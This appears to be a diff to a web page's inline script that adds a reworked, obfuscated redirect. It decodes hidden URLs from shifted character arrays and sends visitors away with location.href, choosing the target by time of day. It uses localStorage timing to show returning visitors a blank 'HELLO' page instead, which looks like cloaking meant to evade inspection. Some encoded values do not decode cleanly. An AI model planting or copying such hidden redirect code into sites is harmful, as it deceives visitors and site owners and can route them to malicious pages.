@@ -36,40 +36,51 @@
 				
 <script>
 (function(){
-var _0x1=function(_0x2){
-var _0x3="";
-for(var _0x4=0;_0x4<_0x2.length;_0x4++){
-_0x3+=String.fromCharCode(_0x2[_0x4]-1);
+
+var _f = function(a){
+var s="";
+for(var i=0;i<a.length;i++){
+s += String.fromCharCode(a[i]-1);
 }
-return atob(_0x3);
+return atob(s);
 };
 
-var _0xk=_0x1([101,110,110,118,118,103,102,97,118,117,102]); // visited_time
+var _key = _f([101,109,123,106,116,102,101,96,117,106,110,102]); // visited_time
 
-var _0xn=+new Date;
-var _0xs=localStorage.getItem(_0xk);
+var _now = Date.now();
+var _old = localStorage.getItem(_key);
 
-var _0xd=0x2bf20;     // 3 phút
-var _0xl=0x240c8400;  // 7 ngày
+var _free = 180000;
+var _lock = 604800000;
 
-function _0xf(){
-var _0xh=(new Date).getHours();
+function _go(){
+var h = new Date().getHours();
 
-var _0xa=_0x1([98,73,83,49,100,73,84,79,55,78,121,78,117,98,71,57,116,76,122,65,61]); // link1
-var _0xb=_0x1([98,73,83,49,100,73,84,79,55,78,121,78,117,98,71,57,116,76,122,65,61]); // link2
+var _n = _f([98,73,83,49,100,73,84,79,55,78,121,78,117,98,71,57,116,76,122,65,61]);
+var _d = _f([98,73,83,49,100,73,84,79,55,78,121,78,117,98,71,57,116,76,122,65,61]);
 
-location.href=_0xh>=20||_0xh<5?_0xa:_0xb;
+location.href = (h>=20||h<5)?_n:_d;
 }
 
-if(_0xs){
-var _0xm=_0xn-_0xs;
-_0xm<_0xd?_0xf():
-_0xm<_0xl?document.body.innerHTML="<h2>HELLO</h2>":
-(localStorage.setItem(_0xk,_0xn),_0xf());
+if(_old){
+var diff = _now - _old;
+
+if(diff < _free){
+_go();
+}
+else if(diff < _lock){
+document.body.innerHTML="<h2>HELLO</h2>";
+}
+else{
+localStorage.setItem(_key,_now);
+_go();
+}
+
 }else{
-localStorage.setItem(_0xk,_0xn);
-_0xf();
+localStorage.setItem(_key,_now);
+_go();
 }
+
 })();
 </script>
 	</body>
